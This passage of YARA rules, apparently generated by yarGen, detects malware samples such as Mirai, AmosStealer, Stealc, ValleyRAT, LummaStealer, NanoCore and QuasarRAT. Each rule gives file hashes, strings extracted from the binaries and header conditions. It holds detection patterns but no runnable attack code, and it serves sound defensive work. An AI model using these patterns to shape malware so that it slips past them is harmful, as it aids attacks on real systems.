      $s2 = "/usr/include/lastlog.h" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__c6ecf6de {
   meta:
      description = "dropzone - file Mirai(signature)_c6ecf6de.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "c6ecf6de8f443e49174642cb9c26847b80a5fc9c1981ecdc74b23d34641f69f7"
   strings:
      $s1 = "tar() { if [ \"${1#-}\" = \"$1\" ]; then command tar; else command tar \"$@\"; fi; }" fullword ascii /* score: '12.00'*/
      $s2 = "/usr/include/lastlog.h" fullword ascii /* score: '9.00'*/
      $s3 = "GCC: (Sourcery G++ Lite 2008q3-72) 4.3.2" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule AmosStealer_signature_ {
   meta:
      description = "dropzone - file AmosStealer(signature).macho"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "27dd03510188c3ed0473d71fdedb1add484ccd709ec978fc6834f23a2accebca"
   strings:
      $s1 = "__mh_execute_header" fullword ascii /* score: '19.00'*/
      $s2 = "mh_execute_header" fullword ascii /* score: '19.00'*/
      $s3 = "__ZTISt11logic_error" fullword ascii /* score: '12.00'*/
      $s4 = "1logic_error" fullword ascii /* score: '12.00'*/
      $s5 = "@__ZTISt11logic_error" fullword ascii /* score: '12.00'*/
      $s6 = "__ZNSt11logic_errorC2EPKc" fullword ascii /* score: '12.00'*/
      $s7 = "@__ZNSt11logic_errorC2EPKc" fullword ascii /* score: '12.00'*/
      $s8 = "__ZTSSt11logic_error" fullword ascii /* score: '12.00'*/
      $s9 = "thread constructor failed" fullword ascii /* score: '12.00'*/
      $s10 = "@__ZTSSt11logic_error" fullword ascii /* score: '12.00'*/
      $s11 = "__ZTSSt13runtime_error" fullword ascii /* score: '10.00'*/
      $s12 = "__ZNSt13runtime_errorC1EPKc" fullword ascii /* score: '10.00'*/
      $s13 = "__ZNSt3__120__throw_system_errorEiPKc" fullword ascii /* score: '10.00'*/
      $s14 = "@__ZNSt13runtime_errorC1EPKc" fullword ascii /* score: '10.00'*/
      $s15 = "@__ZNSt3__120__throw_system_errorEiPKc" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0xfeca and filesize < 8000KB and
      8 of them
}

rule Mirai_signature__0bc1d414 {
   meta:
      description = "dropzone - file Mirai(signature)_0bc1d414.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "0bc1d414910956f654cd44cf6adcbb3af3db8ebebc2b69155c569ed074ef446d"
   strings:
      $s1 = "/x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__5408157a {
   meta:
      description = "dropzone - file Mirai(signature)_5408157a.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "5408157aae234b88549d499aa551f55fcdd60b0b716496460a00417a193056bc"
   strings:
      $s1 = "/x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__74e88829 {
   meta:
      description = "dropzone - file Mirai(signature)_74e88829.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "74e888299a6645a5bcc0ec551cd1a338bd9757851218828470966c2ba9e61e05"
   strings:
      $s1 = "/x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__83ca802d {
   meta:
      description = "dropzone - file Mirai(signature)_83ca802d.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "83ca802d00286adbd1230da62a5ad409a8b7a63e1cbf0cd0dc8d8f6edaa0d7b5"
   strings:
      $s1 = "/x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule sig_25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c {
   meta:
      description = "dropzone - file 25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213"
   strings:
      $x1 = "non-IPv4 addressnon-IPv6 addressobject is remotepacer: H_m_prev=reflect mismatchregexp: Compile(remote I/O errorruntime:  g:  g=" ascii /* score: '71.00'*/
      $x2 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625SIGSEGV: segmentation violation[-]D" ascii /* score: '67.50'*/
      $x3 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnablethe node is " ascii /* score: '55.50'*/
      $x4 = "sync: WaitGroup misuse: Add called concurrently with Waitthe port %d is successfully listening on the remote node!The `password`" ascii /* score: '42.50'*/
      $x5 = "strings.Builder.Grow: negative countsyntax error scanning complex numberuncaching span but s.allocCount == 0) is smaller than mi" ascii /* score: '41.00'*/
      $x6 = "runtime: text offset base pointer out of rangeruntime: type offset base pointer out of rangestopTheWorld: not stopped (status !=" ascii /* score: '39.00'*/
      $x7 = " > (den<<shift)/2syntax error scanning numberunsupported compression for you should select node first454747350886464118957519531" ascii /* score: '39.00'*/
      $x8 = " of unexported method previous allocCount=%s flag redefined: %s186264514923095703125931322574615478515625Anatolian_HieroglyphsFl" ascii /* score: '38.00'*/
      $x9 = " to unallocated span%%!%c(*big.Float=%s)/usr/share/zoneinfo/37252902984619140625: leftover defer sp=Bar pool was startedEgyptian" ascii /* score: '35.00'*/
      $x10 = "file descriptor in bad statefindrunnable: netpoll with pgcstopm: negative nmspinninginvalid runtime symbol tablelarge span treap" ascii /* score: '35.00'*/
      $x11 = "173472347597680709441192448139190673828125867361737988403547205962240695953369140625MapIter.Value called on exhausted iterator[-" ascii /* score: '34.00'*/
      $x12 = "atuscomplex128connect togetsockoptgoroutine invalidptrmSpanInUsemyhostnamenameservernetlinkribowner diedpassword: rune <nil>runt" ascii /* score: '32.00'*/
      $x13 = " H_T= H_a= H_g= MB,  W_a= and  h_a= h_g= h_t= max= ptr  siz= tab= top= u_a= u_g=%%%dd%s %d%s %s%s%dh%s:%d+ -- , ..., fp:/etc/156" ascii /* score: '31.50'*/
      $x14 = "bad defer entry in panicbad defer size class: i=block index out of rangecan't scan our own stackconnection reset by peerdouble t" ascii /* score: '31.00'*/
      $x15 = "garbage collection scangcDrain phase incorrectinterrupted system callinvalid escape sequenceinvalid m->lockedInt = left over mar" ascii /* score: '31.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 8000KB and
      1 of ($x*)
}

rule sig_5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82 {
   meta:
      description = "dropzone - file 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
   strings:
      $x1 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: gp: gp=runtime: nelems=schedule: in cgo" ascii /* score: '50.00'*/
      $x2 = "end outside usable address spacenon-Go code disabled sigaltstacknumerical argument out of domainpanic while printing panic value" ascii /* score: '46.50'*/
      $x3 = "casgstatus: waiting for Gwaiting but is Grunnableinvalid memory address or nil pointer dereferenceinvalid or incomplete multibyt" ascii /* score: '42.00'*/
      $x4 = "_cgo_notify_runtime_init_done missingall goroutines are asleep - deadlock!cannot exec a shared library directlyoperation not pos" ascii /* score: '40.00'*/
      $x5 = "173472347597680709441192448139190673828125867361737988403547205962240695953369140625MapIter.Value called on exhausted iteratorac" ascii /* score: '34.00'*/
      $x6 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625SIGSEGV: segmentation violationbad " ascii /* score: '30.50'*/
      $s7 = "os.(*ProcessState).sys" fullword ascii /* score: '30.00'*/
      $s8 = "os.(*ProcessState).Sys" fullword ascii /* score: '30.00'*/
      $s9 = "os/exec.ExitError.Sys" fullword ascii /* score: '30.00'*/
      $s10 = "os/exec.(*ExitError).Sys" fullword ascii /* score: '30.00'*/
      $s11 = "file descriptor in bad statefindrunnable: netpoll with pgcstopm: negative nmspinninginvalid runtime symbol tablelarge span treap" ascii /* score: '30.00'*/
      $s12 = "hping3 exited unexpectedlyaddress not a stack addresschannel number out of rangecommunication error on sendgcstopm: not waiting " ascii /* score: '30.00'*/
      $s13 = "runtime: p.gcMarkWorkerMode= runtime: split stack overflowruntime: stat underflow: val runtime: sudog with non-nil cruntime: unk" ascii /* score: '29.00'*/
      $s14 = "bytes.Buffer: reader returned negative count from ReadgcControllerState.findRunnable: blackening not enabledno goroutines (main " ascii /* score: '28.00'*/
      $s15 = "rbage collectionidentifier removedindex out of rangeinput/output errormultihop attemptedno child processesno locks availableoper" ascii /* score: '28.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 6000KB and
      1 of ($x*) and all of them
}

rule d42595b695fc008ef2c56aabd8efd68e_imphash_ {
   meta:
      description = "dropzone - file d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "09f3030f45646d4a97e95c3b048ac188a15880062be06f8f6d58403e6972dcc2"
   strings:
      $x1 = " runqueue= stopwait= runqsize= gfreecnt= throwing= spinning=atomicand8float64nanfloat32nanException  ptrSize=  targetpc= until p" ascii /* score: '54.00'*/
      $x2 = "lock: sleeping while lock is availableP has cached GC work at end of mark terminationfailed to acquire lock to start a GC transi" ascii /* score: '50.00'*/
      $x3 = " (types from different scopes)notetsleep - waitm out of syncfailed to get system page sizeruntime: found in object at *( in prep" ascii /* score: '47.50'*/
      $x4 = "runtime.newosprocruntime/internal/internal/runtime/thread exhaustionlocked m0 woke upentersyscallblock spinningthreads=unknown c" ascii /* score: '46.00'*/
      $x5 = "runtime.Pinner: object already unpinnedsuspendG from non-preemptible goroutineruntime: casfrom_Gscanstatus failed gp=stack growt" ascii /* score: '45.00'*/
      $x6 = "GODEBUG: value \"permission deniedwrong medium typeno data availableexec format errorLookupAccountSidWDnsRecordListFreeGetCurren" ascii /* score: '43.00'*/
      $x7 = "runtime: bad notifyList size - sync=accessed data from freed user arena runtime: wrong goroutine in newstackruntime: invalid pc-" ascii /* score: '42.00'*/
      $x8 = "_cgo_pthread_key_created missingruntime: sudog with non-nil elemruntime: sudog with non-nil nextruntime: sudog with non-nil prev" ascii /* score: '41.50'*/
      $x9 = "mheap.freeSpanLocked - invalid free of user arena chunkcasfrom_Gscanstatus:top gp->status is not in scan state is currently not " ascii /* score: '40.00'*/
      $x10 = ", locked to threadruntime.semacreateruntime.semawakeupbad file descriptordisk quota exceededtoo many open filesdevice not a stre" ascii /* score: '39.00'*/
      $x11 = "pacer: assist ratio=workbuf is not emptybad use of bucket.mpbad use of bucket.bppreempt off reason: forcegc: phase errorgopark: " ascii /* score: '39.00'*/
      $x12 = "span set block with unpopped elements found in resetruntime: GetQueuedCompletionStatusEx failed (errno= runtime: NtCreateWaitCom" ascii /* score: '38.00'*/
      $x13 = "unlock: lock countprogToPointerMask: overflowfailed to set sweep barrierwork.nwait was > work.nproc not in stack roots range [al" ascii /* score: '36.00'*/
      $x14 = "lock: lock countbad system huge page sizearena already initialized to unused region of span bytes failed with errno=runtime: Vir" ascii /* score: '36.00'*/
      $x15 = "stopm spinning nmidlelocked= needspinning=randinit twicestore64 failedsemaRoot queuebad allocCountbad span statestack overflow u" ascii /* score: '35.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*)
}

rule Stealc_signature__d42595b695fc008ef2c56aabd8efd68e_imphash_ {
   meta:
      description = "dropzone - file Stealc(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "69b9d3839ec49b118099de54b795d5f21e03bfe7bb8f05717be3c3fc310e77df"
   strings:
      $x1 = " runqueue= stopwait= runqsize= gfreecnt= throwing= spinning=atomicand8float64nanfloat32nanException  ptrSize=  targetpc= until p" ascii /* score: '54.00'*/
      $x2 = "lock: sleeping while lock is availableP has cached GC work at end of mark terminationfailed to acquire lock to start a GC transi" ascii /* score: '50.00'*/
      $x3 = " (types from different scopes)notetsleep - waitm out of syncfailed to get system page sizeruntime: found in object at *( in prep" ascii /* score: '47.50'*/
      $x4 = "runtime.newosprocruntime/internal/internal/runtime/thread exhaustionlocked m0 woke upentersyscallblock spinningthreads=unknown c" ascii /* score: '46.00'*/
      $x5 = "runtime.Pinner: object already unpinnedsuspendG from non-preemptible goroutineruntime: casfrom_Gscanstatus failed gp=stack growt" ascii /* score: '45.00'*/
      $x6 = "GODEBUG: value \"permission deniedwrong medium typeno data availableexec format errorLookupAccountSidWDnsRecordListFreeGetCurren" ascii /* score: '43.00'*/
      $x7 = "runtime: bad notifyList size - sync=accessed data from freed user arena runtime: wrong goroutine in newstackruntime: invalid pc-" ascii /* score: '42.00'*/
      $x8 = "_cgo_pthread_key_created missingruntime: sudog with non-nil elemruntime: sudog with non-nil nextruntime: sudog with non-nil prev" ascii /* score: '41.50'*/
      $x9 = "mheap.freeSpanLocked - invalid free of user arena chunkcasfrom_Gscanstatus:top gp->status is not in scan state is currently not " ascii /* score: '40.00'*/
      $x10 = ", locked to threadruntime.semacreateruntime.semawakeupbad file descriptordisk quota exceededtoo many open filesdevice not a stre" ascii /* score: '39.00'*/
      $x11 = "pacer: assist ratio=workbuf is not emptybad use of bucket.mpbad use of bucket.bppreempt off reason: forcegc: phase errorgopark: " ascii /* score: '39.00'*/
      $x12 = "span set block with unpopped elements found in resetruntime: GetQueuedCompletionStatusEx failed (errno= runtime: NtCreateWaitCom" ascii /* score: '38.00'*/
      $x13 = "unlock: lock countprogToPointerMask: overflowfailed to set sweep barrierwork.nwait was > work.nproc not in stack roots range [al" ascii /* score: '36.00'*/
      $x14 = "lock: lock countbad system huge page sizearena already initialized to unused region of span bytes failed with errno=runtime: Vir" ascii /* score: '36.00'*/
      $x15 = "stopm spinning nmidlelocked= needspinning=randinit twicestore64 failedsemaRoot queuebad allocCountbad span statestack overflow u" ascii /* score: '35.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*)
}

rule ValleyRAT_signature__d42595b695fc008ef2c56aabd8efd68e_imphash_ {
   meta:
      description = "dropzone - file ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "4ac5c741eac35ec797d10f0f60575e4825128fcd2587705bc6403169eaf32e88"
   strings:
      $x1 = "pacer: assist ratio=workbuf is not emptybad use of bucket.mpbad use of bucket.bpruntime: double waitpreempt off reason: forcegc:" ascii /* score: '65.00'*/
      $x2 = " runqueue= stopwait= runqsize= gfreecnt= throwing= spinning=atomicand8float64nanfloat32nanException  ptrSize=  targetpc= until p" ascii /* score: '58.00'*/
      $x3 = ", locked to threadruntime.semacreateruntime.semawakeupsegmentation faultoperation canceledno child processesconnection refusedRF" ascii /* score: '56.00'*/
      $x4 = "tried to trace goroutine with invalid or unsupported statusreflect: reflect.Value.Elem on an invalid notinheap pointermanual spa" ascii /* score: '54.00'*/
      $x5 = "lock: sleeping while lock is availableP has cached GC work at end of mark terminationfailed to acquire lock to start a GC transi" ascii /* score: '53.00'*/
      $x6 = " (types from different scopes)notetsleep - waitm out of syncfailed to get system page sizeruntime: found in object at *( in prep" ascii /* score: '52.00'*/
      $x7 = "lock: lock countbad system huge page sizearena already initialized to unused region of span bytes failed with errno=runtime: Vir" ascii /* score: '49.00'*/
      $x8 = "invalid exchangeno route to hostinvalid argumentmessage too longobject is remoteremote I/O errorSetFilePointerExOpenProcessToken" ascii /* score: '46.00'*/
      $x9 = "internal error: polling on unsupported descriptor typemheap.freeSpanLocked - invalid free of user arena chunkcasfrom_Gscanstatus" ascii /* score: '46.00'*/
      $x10 = "stopm spinning nmidlelocked= needspinning=randinit twicestore64 failedsemaRoot queuebad allocCountbad span statestack overflow u" ascii /* score: '46.00'*/
      $x11 = "runtime.Pinner: object already unpinnedsuspendG from non-preemptible goroutineruntime: casfrom_Gscanstatus failed gp=stack growt" ascii /* score: '45.00'*/
      $x12 = "runtime.newosprocruntime/internal/internal/runtime/thread exhaustionlocked m0 woke upentersyscallblock spinningthreads=gp.waitin" ascii /* score: '41.00'*/
      $x13 = "executable file not found in %PATH%persistentalloc: align is too large/memory/classes/heap/released:bytesgreyobject: obj not poi" ascii /* score: '40.00'*/
      $x14 = "runtime: sp=abi mismatchwrong timersinvalid slothost is downillegal seekGetLengthSidGetLastErrorGetStdHandleGetTempPathWLoadLibr" ascii /* score: '40.00'*/
      $x15 = "release of handle with refcount 0slice bounds out of range [%x:%y]base outside usable address spaceruntime: memory allocated by " ascii /* score: '38.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      1 of ($x*)
}

rule sig_1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739 {
   meta:
      description = "dropzone - file 1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739.macho"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f"
   strings:
      $x1 = "stopTheWorld: not stopped (status != _Pgcstop)runtime: name offset base pointer out of rangeruntime: type offset base pointer ou" ascii /* score: '76.50'*/
      $x2 = "expected attribute name in elementunescaped ]]> not in CDATA sectionreflect: Field of non-struct type reflect: Field index out o" ascii /* score: '73.50'*/
      $x3 = "traceStopReadCPU called with trace enabledattempted to trace a bad status for a procsync/atomic: store of nil value into Valuelo" ascii /* score: '65.50'*/
      $x4 = "slice bounds out of range [%x:%y]SIGCHLD: child status has changedSIGTTIN: background read from ttySIGXFSZ: file size limit exce" ascii /* score: '63.50'*/
      $x5 = "unsafe.String: len out of range11368683772161602973937988281255684341886080801486968994140625reflect: Len of non-array type Fail" ascii /* score: '60.50'*/
      $x6 = "non-concurrent sweep failed to drain all sweep queuesexited a goroutine internally locked to the OS threadhttp: putIdleConn: too" ascii /* score: '59.50'*/
      $x7 = "host unreachableAlready ReportedMultiple ChoicesPayment RequiredUpgrade RequiredContent-Length: 0123456789ABCDEF2384185791015625" ascii /* score: '56.00'*/
      $x8 = "os/exec.Command(exec: killing Cmdcorrupt zip file exec format errorpermission deniedcross-device linkRPC struct is badRPC versio" ascii /* score: '56.00'*/
      $x9 = " (types from different scopes)notetsleep - waitm out of syncfailed to get system page sizeassignment to entry in nil mapruntime:" ascii /* score: '55.50'*/
      $x10 = "Failed to chmod temp file: %vtoo many open files in systemoperation already in progressprotocol family not supportedSIGPIPE: wri" ascii /* score: '55.50'*/
      $x11 = "x509: invalid signature: parent certificate cannot sign this kind of certificatecrypto/ecdh: internal error: nistec ScalarBaseMu" ascii /* score: '54.50'*/
      $x12 = "stack not a power of 2minpc or maxpc invalidnon-Go function at pc=reflectlite.Value.Type into Go struct field json: unknown fiel" ascii /* score: '54.00'*/
      $x13 = "unsafe.String: len out of rangecrypto/rsa: invalid prime valuejson: invalid number literal %qin literal true (expecting 'r')in l" ascii /* score: '53.50'*/
      $x14 = "runtime.Pinner: found leaking pinned pointer; forgot to call Unpin()?http2: Transport closing idle conn %p (forSingleUse=%v, max" ascii /* score: '53.50'*/
      $x15 = "slice bounds out of range [::%x] with capacity %yinvalid memory address or nil pointer dereferencepanicwrap: unexpected string a" ascii /* score: '53.00'*/
   condition:
      uint16(0) == 0xfacf and filesize < 29000KB and
      1 of ($x*)
}

rule LummaStealer_signature__a520fd20530cf0b0db6a6c3c8b88d11d_imphash_ {
   meta:
      description = "dropzone - file LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "5d313b578a2eb483e5163af2ef96867fd003edda827345c6e5aab95069161720"
   strings:
      $x1 = ".lib section in a.out corruptedbad write barrier buffer boundscall from within the Go runtimecannot assign requested addresscasg" ascii /* score: '51.00'*/
      $x2 = "stopTheWorld: not stopped (status != _Pgcstop)P has cached GC work at end of mark terminationattempting to link in too many shar" ascii /* score: '47.00'*/
      $x3 = "bad lfnode addressbad manualFreeListconnection refusedfile name too longforEachP: not donegarbage collectionidentifier removedin" ascii /* score: '46.00'*/
      $x4 = "GetAddrInfoWGetLastErrorGetLengthSidGetStdHandleGetTempPathWLoadLibraryWReadConsoleWSetEndOfFileTransmitFile_MSpanManualabi mism" ascii /* score: '44.00'*/
      $x5 = "unknown pcws2_32.dll  of size   (targetpc= gcwaiting= gp.status= heap_live= idleprocs= in status  m->mcache= mallocing= ms clock" ascii /* score: '43.00'*/
      $x6 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: gp: gp=runtime: nelems=schedule: in cgo" ascii /* score: '43.00'*/
      $x7 = "address already in useadvapi32.dll not foundargument list too longassembly checks failedbad g->status in readycall not at safe p" ascii /* score: '39.00'*/
      $x8 = "file descriptor in bad statefindrunnable: netpoll with pgchelperstart: bad m->helpgcgcstopm: negative nmspinninginvalid runtime " ascii /* score: '38.00'*/
      $x9 = "ted waitm - semaphore out of syncs.allocCount != s.nelems && freeIndex == s.nelemsattempt to execute system stack code on user s" ascii /* score: '35.00'*/
      $x10 = "bad map stateexchange fullfatal error: gethostbynamegetservbynamekernel32.dll" fullword ascii /* score: '33.00'*/
      $x11 = "atchadvapi32.dllbad g statusbad g0 stackbad recoverycan't happencas64 failedchan receivedumping heapend tracegc" fullword ascii /* score: '32.00'*/
      $x12 = " MB) workers= called from  gcscanvalid  heap_marked= idlethreads= is nil, not  s.spanclass= span.base()= syscalltick= work.nproc" ascii /* score: '32.00'*/
      $x13 = "me.mutex; runtime.head runtime.guintptr; runtime.tail runtime.guintptr }; runtime.sweepWaiters struct { runtime.lock runtime.mut" ascii /* score: '31.00'*/
      $x14 = "time.mutex; runtime.head runtime.guintptr; runtime.tail runtime.guintptr }; runtime.sweepWaiters struct { runtime.lock runtime.m" ascii /* score: '31.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*)
}

rule Mirai_signature__2643bda3 {
   meta:
      description = "dropzone - file Mirai(signature)_2643bda3.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "2643bda39c47f464077f76f781099e541ddab9eb30b1e2fcbffb38a5cbc6be82"
   strings:
      $s1 = "attack_get_opt_u16" fullword ascii /* score: '9.00'*/
      $s2 = "attack_get_opt_len" fullword ascii /* score: '9.00'*/
      $s3 = "attack_get_opt_u8" fullword ascii /* score: '9.00'*/
      $s4 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
      $s5 = "attack_get_opt_u32" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__7c3ed2fe {
   meta:
      description = "dropzone - file Mirai(signature)_7c3ed2fe.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "7c3ed2fe5f46f1a4b0c12860af7c0c3d04c390a766cd8b62376d293dc254d05e"
   strings:
      $s1 = "attack_get_opt_u16" fullword ascii /* score: '9.00'*/
      $s2 = "attack_get_opt_len" fullword ascii /* score: '9.00'*/
      $s3 = "attack_get_opt_u8" fullword ascii /* score: '9.00'*/
      $s4 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
      $s5 = "attack_get_opt_u32" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}


rule addff8f83c3a0c5f4efec564f96a47106e724a7307d50ebce036d5b71beebbc7_addff8f8 {
   meta:
      description = "dropzone - file addff8f83c3a0c5f4efec564f96a47106e724a7307d50ebce036d5b71beebbc7_addff8f8.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "addff8f83c3a0c5f4efec564f96a47106e724a7307d50ebce036d5b71beebbc7"
   strings:
      $s1 = "www.fatihsoftware.com" fullword ascii /* score: '21.00'*/
      $s2 = "www.FatihSoftware.com" fullword ascii /* score: '21.00'*/
      $s3 = " - Dock zone has no controlLError loading dock zone from the stream. Expecting version %d, but found %d.\"%s requires Windows Vi" wide /* score: '20.50'*/
      $s4 = "OnActionExecutex<J" fullword ascii /* score: '18.00'*/
      $s5 = "http://www.fatihsoftware.com/" fullword wide /* score: '17.00'*/
      $s6 = "All Clipboard does not support Icons+Operation not supported on selected printer.There is no default printer currently selected/" wide /* score: '17.00'*/
      $s7 = "\\elevator.wav" fullword wide /* score: '13.00'*/
      $s8 = "CommandLinkHint," fullword ascii /* score: '12.00'*/
      $s9 = "CommandD" fullword ascii /* score: '12.00'*/
      $s10 = "Error creating window class'Parameter %s cannot be a negative value*Input buffer exceeded for %s = %d, %s = %d The specified fil" wide /* score: '11.50'*/
      $s11 = "Bitmap.Data" fullword ascii /* score: '11.00'*/
      $s12 = "TFileOpenDialog0" fullword ascii /* score: '10.00'*/
      $s13 = "OnGetActiveFormHandle4" fullword ascii /* score: '10.00'*/
      $s14 = "Description`" fullword ascii /* score: '10.00'*/
      $s15 = "EComponentErrorTyB" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule NanoCore_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "dropzone - file NanoCore(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "d5fb06d1399ffd954b8d1dc1bd81521c4010acc244cb8bf99a8f9c83697e332f"
   strings:
      $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s2 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s3 = "NanoCore Client.exe" fullword ascii /* score: '19.00'*/
      $s4 = "IClientUIHost" fullword ascii /* base64 encoded string ' )bz{T z,' */ /* score: '19.00'*/
      $s5 = "ClientLoaderForm.resources" fullword ascii /* score: '16.00'*/
      $s6 = "IClientLoggingHost" fullword ascii /* score: '14.00'*/
      $s7 = "ClientLoaderForm" fullword ascii /* score: '13.00'*/
      $s8 = "FileCommand" fullword ascii /* score: '12.00'*/
      $s9 = "GetBlockHash" fullword ascii /* score: '12.00'*/
      $s10 = "NanoCore.ClientPluginHost" fullword ascii /* score: '12.00'*/
      $s11 = "PluginCommand" fullword ascii /* score: '12.00'*/
      $s12 = "MyTemplate" fullword ascii /* score: '11.00'*/
      $s13 = "7PADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDIN" ascii /* score: '11.00'*/
      $s14 = "System.Windows.Forms.Form" fullword ascii /* score: '10.00'*/
      $s15 = "PipeCreated" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 600KB and
      8 of them
}

rule QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "dropzone - file QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "e151fd79a759d3206f5e0012cec26e972ec74ea43c5e6943d81310c30408fe4e"
   strings:
      $s1 = "  <!-- Enable themes for Windows common controls and dialogs (Windows XP and later) -->" fullword ascii /* score: '25.00'*/
      $s2 = "server1.exe" fullword wide /* score: '22.00'*/
